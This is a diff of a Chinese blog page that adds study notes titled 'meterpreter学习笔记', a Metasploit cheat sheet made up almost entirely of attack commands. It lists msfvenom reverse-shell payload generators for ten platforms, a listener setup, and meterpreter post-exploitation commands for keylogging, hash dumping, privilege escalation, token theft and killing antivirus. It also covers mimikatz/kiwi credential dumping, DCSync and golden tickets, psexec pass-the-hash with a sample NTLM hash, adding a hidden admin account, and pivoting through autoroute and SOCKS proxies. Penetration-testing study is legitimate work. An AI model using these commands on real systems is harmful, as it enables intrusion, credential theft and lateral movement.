@@ -16,14 +16,18 @@
   <meta name="author" content="Rounuooo">
   <meta name="keywords" content="">
   
-    <meta property="og:type" content="article">
+    <meta name="description" content="MSF操作指令 ：基础操作:1 . 生成木马 1234567891011121314151617181920212223242526272829303132333435363738394041Linux:msfvenom -p linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;&lt;Your IP Address&gt; LPORT&#x3D;&lt;YourPort to">
+<meta property="og:type" content="article">
 <meta property="og:title" content="meterpreter学习笔记">
 <meta property="og:url" content="http://example.com/2022/10/28/meterpreter%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/index.html">
 <meta property="og:site_name" content="Rounuooo的小站">
+<meta property="og:description" content="MSF操作指令 ：基础操作:1 . 生成木马 1234567891011121314151617181920212223242526272829303132333435363738394041Linux:msfvenom -p linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;&lt;Your IP Address&gt; LPORT&#x3D;&lt;YourPort to">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2022-10-28T02:02:51.000Z">
-<meta property="article:modified_time" content="2022-10-28T02:02:51.576Z">
+<meta property="article:modified_time" content="2022-10-28T02:33:10.542Z">
 <meta property="article:author" content="Rounuooo">
+<meta property="article:tag" content="内网">
+<meta property="article:tag" content="MSF">
 <meta name="twitter:card" content="summary_large_image">
   
   
@@ -216,7 +220,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          0 字
+          4.6k 字
         
       </span>
     
@@ -227,7 +231,7 @@
         
         
         
-          1 分钟
+          39 分钟
         
       </span>
     
@@ -270,7 +274,45 @@
             
               <div class="markdown-body">
                 
-                
+                <h2 id="MSF操作指令-："><a href="#MSF操作指令-：" class="headerlink" title="MSF操作指令 ："></a>MSF操作指令 ：</h2><h4 id="基础操作"><a href="#基础操作" class="headerlink" title="基础操作:"></a>基础操作:</h4><p>1 . 生成木马</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Linux:<br>msfvenom -p linux/x86/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"></span><br><span class="hljs-built_in">Port </span><span class="hljs-keyword">to</span> Connect On&gt; -f elf &gt; shell.elf<br><br>Windows:<br>msfvenom -p windows/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"></span><br><span class="hljs-built_in">Port </span><span class="hljs-keyword">to</span> Connect On&gt; -f exe &gt; shell.exe<br><br>Mac:<br>msfvenom -p osx/x86/shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span><br>Connect On&gt; -f macho &gt; shell.macho<br><br>PHP:<br>msfvenom -p php/meterpreter_reverse_tcp <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port</span><br><span class="hljs-built_in"></span><span class="hljs-keyword">to</span> Connect On&gt; -f<span class="hljs-built_in"> raw </span>&gt; shell.php<br>cat shell.php | pbcopy &amp;&amp; echo <span class="hljs-string">&#x27;&lt;?php &#x27;</span> | tr -d <span class="hljs-string">&#x27;\n&#x27;</span> &gt; shell.php &amp;&amp; pbpaste &gt;&gt;<br>shell.php<br><br>ASP:<br>msfvenom -p windows/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"></span><br><span class="hljs-built_in">Port </span><span class="hljs-keyword">to</span> Connect On&gt; -f asp &gt; shell.asp<br><br>JSP:<br>msfvenom -p java/jsp_shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port</span><br><span class="hljs-built_in"></span><span class="hljs-keyword">to</span> Connect On&gt; -f<span class="hljs-built_in"> raw </span>&gt; shell.jsp<br><br>WAR:<br>msfvenom -p java/jsp_shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port</span><br><span class="hljs-built_in"></span><span class="hljs-keyword">to</span> Connect On&gt; -f war &gt; shell.war<br><br>Python:<br>msfvenom -p cmd/unix/reverse_python <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span><br>Connect On&gt; -f<span class="hljs-built_in"> raw </span>&gt; shell.py<br><br>Bash :<br>msfvenom -p cmd/unix/reverse_bash <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span><br>Connect On&gt; -f<span class="hljs-built_in"> raw </span>&gt; shell.sh<br><br>Perl:<br>msfvenom -p cmd/unix/reverse_perl <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span><br>Connect On&gt; -f<span class="hljs-built_in"> raw </span>&gt; shell.pl<br></code></pre></td></tr></table></figure>
+
+
+
+<p>2 .生成监听器 :</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> PAYLOAD <span class="hljs-comment">&lt;Payload name&gt;</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">LHOST &lt;LHOST value&gt;</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">LPORT &lt;LPORT value&gt;</span><br>run<br></code></pre></td></tr></table></figure>
+
+<h4 id="Meterpreter操作指南"><a href="#Meterpreter操作指南" class="headerlink" title="Meterpreter操作指南 :"></a>Meterpreter操作指南 :</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">backgroup</span> 放置后台<br><span class="hljs-attribute">sessions</span> 查看后台会话<br><span class="hljs-attribute">sessions</span> <span class="hljs-number">1</span> 选择会话<br><span class="hljs-attribute">sessions</span> -k <span class="hljs-number">1</span> 杀死会话<br></code></pre></td></tr></table></figure>
+
+<p>常用操作 :</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs awk">meterpreter &gt; background 放回后台<br>meterpreter &gt; <span class="hljs-keyword">exit</span> 关闭会话<br>meterpreter &gt; help 帮助信息<br>meterpreter &gt; Sysinfo 系统平台信息<br>meterpreter &gt; screenshot 屏幕截取<br>meterpreter &gt; shell 命令行shell (<span class="hljs-keyword">exit</span>退出)<br>meterpreter &gt; getlwd 查看本地目录<br>meterpreter &gt; lcd 切换本地目录<br>meterpreter &gt; getwd 查看目录<br>meterpreter &gt; ls 查看文件目录列表<br>meterpreter &gt; cd 切换目录<br>meterpreter &gt; rm 删除文件<br>meterpreter &gt; download C:\\Users\\<span class="hljs-number">123</span>\\Desktop\\<span class="hljs-number">1</span>.txt <span class="hljs-number">1</span>.txt 下载文件<br>meterpreter &gt; upload <span class="hljs-regexp">/var/</span>www/wce.exe wce.exe 上传文件<br>meterpreter &gt; search -d c: -f *.doc 搜索文件<br>meterpreter &gt; execute -f cmd.exe -i 执行程序/命令<br>meterpreter &gt; ps 查看进程<br>meterpreter &gt; run post<span class="hljs-regexp">/windows/</span>capture/keylog_recorder 键盘记录<br>meterpreter &gt; getuid 查看当前用户权限<br>meterpreter &gt; use priv 加载特权模块<br>meterpreter &gt; getsystem 提升到SYSTEM权限<br>meterpreter &gt; hashdump 导出密码散列<br>meterpreter &gt; ps 查看高权限用户PID<br>meterpreter &gt; steal_token &lt;PID&gt; 窃取令牌<br>meterpreter &gt; rev2self 恢复原来的令牌<br>meterpreter &gt; migrate pid 迁移进程<br>meterpreter &gt; run killav 关闭杀毒软件<br>meterpreter &gt; run getgui-e 启用远程桌面<br>meterpreter &gt; portfwd add -l <span class="hljs-number">1234</span> -p <span class="hljs-number">3389</span> -r &lt;目标IP&gt; 端口转发<br>meterpreter &gt; run get_local_subnets 获取内网网段信息<br>meterpreter &gt; run autoroute -s &lt;内网网段&gt; 创建自动路由<br>meterpreter &gt; run autoroute -p 查看自动路由表<br><br>创建代理通道:<br>msf &gt; use auxiliary<span class="hljs-regexp">/server/</span>socks4a 设置socks4代理模块<br>msf auxiliary(socks4a) &gt; show options<br>msf auxiliary(socks4a) &gt; run<br>配置proxychains参数：<br>nano <span class="hljs-regexp">/etc/</span>proxychains.conf 修改代理监听端口,和前面端口一致<br></code></pre></td></tr></table></figure>
+
+<h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz :"></a>mimikatz :</h4><p>在最新的版本中load mimikatz已经取消 现在使用kiwi模块</p>
+<p>load kiwi</p>
+<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">creds_all：列举所有凭据<br>creds_kerberos：列举所有kerberos凭据<br>creds_msv：列举所有msv凭据<br>creds_ssp：列举所有ssp凭据<br>creds_tspkg：列举所有tspkg凭据<br>creds_wdigest：列举所有wdigest凭据<br>dcsync：通过DCSync检索用户帐户信息<br>dcsync_ntlm：通过DCSync检索用户帐户NTLM散列、SID和RID<br>golden_ticket_create：创建黄金票据<br>kerberos_ticket_list：列举kerberos票据<br>kerberos_ticket_purge：清除kerberos票据<br>kerberos_ticket_use：使用kerberos票据<br>kiwi_cmd：执行mimikatz的命令，后面接mimikatz.exe的命令<br>ls<span class="hljs-built_in">a_dump</span>_sam：dump出lsa的SAM<br>ls<span class="hljs-built_in">a_dump</span>_secrets：dump出lsa的密文<br>password_change：修改密码<br>wifi_list：列出当前用户的wifi配置文件<br>wifi_list_shared：列出共享wifi配置文件/编码<br><br>creds_all #该命令可以列举系统中的明文密码 <br>kiwi_cmd kiwi_cmd 模块可以让我们使用mimikatz的全部功能，该命令后面接 mimikatz.exe 的命令 <br><span class="hljs-title">例如 ：kiwi_cmd sekurlsa::</span>logonpasswords<br></code></pre></td></tr></table></figure>
+
+<h4 id="内网渗透-psexec："><a href="#内网渗透-psexec：" class="headerlink" title="内网渗透 psexec："></a>内网渗透 psexec：</h4><p>参考 : <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46258964/article/details/124216187">https://blog.csdn.net/qq_46258964/article/details/124216187</a></p>
+<p>在metasploite中存在一个psexec模块可以使用获取的hash进行登录</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs gams">use exploit/windows/smb/psexec<br><span class="hljs-keyword">set</span> SMBUser <span class="hljs-comment">administrator</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">smbpass aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">payload windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">lhost 10.10.10.139</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">lport 6666</span><br>exploit<br><br>ps <span class="hljs-comment">:</span> 除了可以用<span class="hljs-comment">hash</span> 也可以使用明文<br></code></pre></td></tr></table></figure>
+
+<h4 id="内网渗透-开启远程终端-添加账号"><a href="#内网渗透-开启远程终端-添加账号" class="headerlink" title="内网渗透-开启远程终端-添加账号 :"></a>内网渗透-开启远程终端-添加账号 :</h4><p> getgui 模块——开启远程桌面</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">run</span> getgui -e 开启远程终端<br><span class="hljs-built_in">run</span> post/windows/manage/enable_rdp<br><span class="hljs-built_in">run</span> getgui -u m -p QWEasd123 添加本地管理员<br></code></pre></td></tr></table></figure>
+
+<h4 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h4><p>如果服务器防火墙开启的情况下，有可能拦截远程终端端口，使用命令把远程端口3389转发出来</p>
+<p>端口转发可以让攻击机访问本来无法直接访问的目标主机。portfwd可以反弹单个端口到本地并且监听。</p>
+<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs diff">meterpreter &gt; portfwd add -l 3389 -r 192.168.0.130 -p 3389<br><span class="hljs-deletion">-l 本地监听端口</span><br><span class="hljs-deletion">-r 远程地址</span><br><span class="hljs-deletion">-p 远程端口</span><br></code></pre></td></tr></table></figure>
+
+<p>端口转发到本地1234端口</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">rdesktop</span> <span class="hljs-number">127.0.0.1:1234</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="跨路由访问"><a href="#跨路由访问" class="headerlink" title="跨路由访问"></a>跨路由访问</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">在渗透测试过程中，经常拿到web主机与数据库不同在一个网段，可以得出这台主机还连着一个内网，<br>如果想要继续渗透内网，可以把这台web主机当作跳板机，对内网进行渗透<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs arduino">获取内网网卡命令 <br>run get_local_subnets<br>绑定路由 不绑定路由就没法访问目标主机<br>run autoroute -s <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span> <br>route add <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.0</span> <span class="hljs-number">255.255</span><span class="hljs-number">.255</span><span class="hljs-number">.0</span>  <span class="hljs-number">1</span>    <span class="hljs-comment">//1是 sessions序号</span><br>route print<br></code></pre></td></tr></table></figure>
+
+<p>使用隧道 默认是使用socks5 也可以选择socks4a</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">use auxiliary<span class="hljs-regexp">/server/</span>socks_proxy<br>编辑一下proxy就可以使用了<br></code></pre></td></tr></table></figure>
+
+
                 
               </div>
             
@@ -278,6 +320,15 @@
             <div>
               <div class="post-metas my-3">
   
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%86%85%E7%BD%91/">#内网</a>
+      
+        <a href="/tags/MSF/">#MSF</a>
+      
+    </div>
   
 </div>
 
